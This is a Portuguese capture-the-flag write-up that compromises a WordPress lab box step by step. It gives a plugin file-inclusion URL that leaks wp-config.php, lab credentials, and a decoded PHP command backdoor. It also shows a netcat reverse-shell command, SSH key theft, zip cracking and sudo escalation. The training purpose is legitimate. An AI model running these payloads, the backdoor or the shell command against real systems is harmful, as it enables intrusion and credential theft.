### Reconhecimento:

<img width="845" height="270" alt="imagem" src="https://github.com/user-attachments/assets/b525cddc-67dd-4990-a239-986b359ed3a7" />

--> Importantes:

    - www.smol.thm --> adicione dentro do arquivo /etc/hosts para conseguir abrir o site
    - wordpress 6.7.1
    - linux S.O
    - Apache 2.4.41
--> Portas:

    - 22 SSH
    - 80 HTTP

--> Diretórios encontrados pelos links ao ver a source do site:

    - index.php/2023/08/16/rce/
    - index.php/2023/08/16/ssrf/
    - index.php/2023/08/16/xss/

### Como o site é wordpress, diretórios padrão do CMS são:

    - wp-login.php
    - wp-admin.php
    - wp-config.php -> onde contém credênciais de banco de dados!

### Enumerando usuários com wpscan:

    - wpscan --url http://www.smol.thm/ --api-token=SUA-API-TOKEN --enumerate u

<img width="1052" height="806" alt="imagem" src="https://github.com/user-attachments/assets/b6e22f96-aeb7-46f0-81c1-53101b0bfe6d" />

### Enumerando plugin vulnerável e possíveis versões conhecidas:

    - wpscan --url http://www.smol.thm/ --api-token=API-TOKEN --enumerate vp --plugins-detection=aggressive

<img width="1179" height="530" alt="imagem" src="https://github.com/user-attachments/assets/f5ebea42-95b0-43e5-9b97-205f10366f96" />

--> Plugin interessante encontrado:

    - jsmol2wp versão <= 1.07 contém três vulnerabilidades:
        - SSRF - Server Side Request Forgery
        - XSS Refletido!
        - Local File Inclusion com leitura arbitrária de arquivos -> Essa não apareceu mas é possível fazer!

### POC para exploração do plugin:

--> POC:

    - http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
      |_> Essa poc já revela as credênciais no arquivo de configurações do banco de dados!
      |_> Com elas também é possível logar na aplicação!
      |_> O uso do wrapper `php://filter` permite ler arquivos PHP sem executá-los,

isso permite acesso total ao banco de dados, podendo levar a dump de usuários, hashes e potencial comprometimento completo da aplicação

retornando seu conteúdo em texto puro.

<img width="1673" height="641" alt="imagem" src="https://github.com/user-attachments/assets/79effd7a-6f9b-42f1-afb2-189de14df8e6" />

--> Credênciais encontradas:

    - Username: wpuser
    - Password: kbLSF2Vop#lw3rjDZ629*Z%G

### Dentro da aplicação:

--> Página interessante:

<img width="1880" height="555" alt="imagem" src="https://github.com/user-attachments/assets/8377e31e-14fb-4a88-b545-ff5880261ac4" />

--> Por que é interessante?

  - Porque mostra tasks a serem feitas quando você abre a página e revela uma informação importante!

<img width="1880" height="555" alt="imagem" src="https://github.com/user-attachments/assets/058f1dd8-8907-48de-b4f5-f0bf1f750226" />

--> Pedindo para revisar o código do plugin hello dolly e analisar o código do site

### Analisando o código:

<img width="1893" height="395" alt="imagem" src="https://github.com/user-attachments/assets/f986088d-a3df-4e33-8400-7a1eac92225b" />

--> Código de backdoor ofuscado, pelo eval() já da para saber!

    -> Decode: echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d
    -> Resolução 1: if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
    -> Resolução 2: if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
    
--> Temos uma backdoor no site pronta para uso!

<img width="984" height="338" alt="imagem" src="https://github.com/user-attachments/assets/09bd27a1-8f5f-4411-9960-b0b89c3e94ac" />

### Por que que a backdoor la no plugin hello dolly funciona aqui no wp-admin/index.php??

--> Por causa dessa função aqui:

<img width="984" height="338" alt="Captura de ecrã de 2026-03-18 23-33-45" src="https://github.com/user-attachments/assets/b83441e9-7faf-4883-bd6a-a18bc710e0e7" />

--> add_action( 'admin_notices', 'hello_dolly' );

--> Essa função faz com que a função rode em todas as páginas do painel admin. Por isso ela funcionará na index.php!


### Ganhando uma shell no servidor:

--> http://www.smol.thm/wp-admin/index.php?cmd=busybox nc IP PORTA -e sh

<img width="833" height="338" alt="imagem" src="https://github.com/user-attachments/assets/124a4057-5c0a-4cc2-8c99-f4c55db4f777" />


### Verificando usuários:

<img width="867" height="264" alt="imagem" src="https://github.com/user-attachments/assets/91708b54-043d-4533-805d-36a880f161a7" />

### Logando no mysql com as credênciais encontradas para capturar as senhas dos outros usuários!

<img width="1800" height="653" alt="imagem" src="https://github.com/user-attachments/assets/bc8705f1-f151-47a0-885f-af6571647fc2" />

### Movimentação lateral (1):

--> Pegando shell como usuário diego utilizando a senha que conseguimos quebrar dele!
    
    - su diego
    - password: PASSWORD AQUI
    
<img width="442" height="85" alt="imagem" src="https://github.com/user-attachments/assets/022f3fb5-4e8a-4ead-a097-091a359d3b0f" />

### Voltando para as pastas de usuários, encontrei algo interessante:

--> Sempre gosto de tentar listar as coisas dentro de cada pasta de usuários e veja só, tenho acesso a pasta .ssh do usuário THINK!

<img width="687" height="492" alt="imagem" src="https://github.com/user-attachments/assets/a8f81145-0325-40b8-90df-ddfb1d8cfb53" />

--> A partir dai, eu peguei a id_rsa do usuário THINK e me loguei no ssh usando ela!

<img width="686" height="301" alt="imagem" src="https://github.com/user-attachments/assets/7ed5d221-2c9f-45d6-a9b8-873f6a0b88f2" />

--> Obviamente não mostrei a chave toda ai no print!

### Logando no ssh:

    - chmod 600 id_rsa
    - ssh -i id_rsa think@10.64.147.7
    - Username: think
    - Password: não preciso da senha pois tenho a id_rsa sem passphrase

<img width="850" height="652" alt="imagem" src="https://github.com/user-attachments/assets/9e683dcb-80e0-4b58-9c24-9baea974018b" />

### Movimentação lateral (2):

--> Como não achei a senha do gege e consegui listar o diretório dele e vi esse arquivo:

<img width="818" height="207" alt="imagem" src="https://github.com/user-attachments/assets/d7427794-ddca-4eb6-a819-5fda2d21cad4" />

--> Achei o arquivo interessante porém não dava para pegar o arquivo! Então como eu não achei a senha dele e nenhum binário que rodasse
com a permissão dele, resolvi olhar no arquivo /etc/pam.d/su onde mostra as permissões ao utilizar o su!

<img width="820" height="221" alt="imagem" src="https://github.com/user-attachments/assets/5dca77a5-8d47-4320-a9d5-31ffcfcf1906" />

Para minha surpresa, eu poderia subir privilégio apenas digitando:

    - su gege
  
Dessa forma eu virei usuário gege e agora eu preciso subir um servidor python para fazer o download do arquivo wordpress.old.zip!

<img width="816" height="98" alt="imagem" src="https://github.com/user-attachments/assets/6c886984-94eb-4042-91c5-a77fa3955513" />

### Fazendo download do arquivo:

<img width="1877" height="304" alt="imagem" src="https://github.com/user-attachments/assets/6fbfeae4-e3df-4f41-a2ee-5c97f48ef874" />

### Quebrando a senha do arquivo zip com jhon:

    - ~/Tools/john/run/zip2john wordpress.old.zip >> hashzip.txt
    - john hashzip.txt --wordlist=/home/nanoxsec/Downloads/Wordlists/rockyou.txt
    - unzip wordpress.old.zip
    - password: coloque a senha encontrada aqui

## Analizando o arquivo gerado [wordpress.old]:

<img width="835" height="486" alt="imagem" src="https://github.com/user-attachments/assets/98aae126-e826-420f-a2a3-3f7981f16ec3" />

--> Lendo o conteúdo de wp-config.php eu encontrei a senha do usuário XAVI!

<img width="970" height="725" alt="imagem" src="https://github.com/user-attachments/assets/2e900510-cc8b-4cfd-a45a-fb8bf1f2a1d3" />

### Movimentação lateral (3):

<img width="927" height="95" alt="imagem" src="https://github.com/user-attachments/assets/00c6085a-83bb-4bc1-a569-bd10eea8f0dc" />

--> Agora já sou usuário xavi!

### Escalando privilégio para root:

<img width="929" height="172" alt="imagem" src="https://github.com/user-attachments/assets/7982738d-67e2-4031-939b-f44e01334612" />

    - sudo -l
    - Usuário XAVI pode virar usuário root!
    - Agora é só pegar as flags!

### CTF FINALIZADO BY NANOXSEC
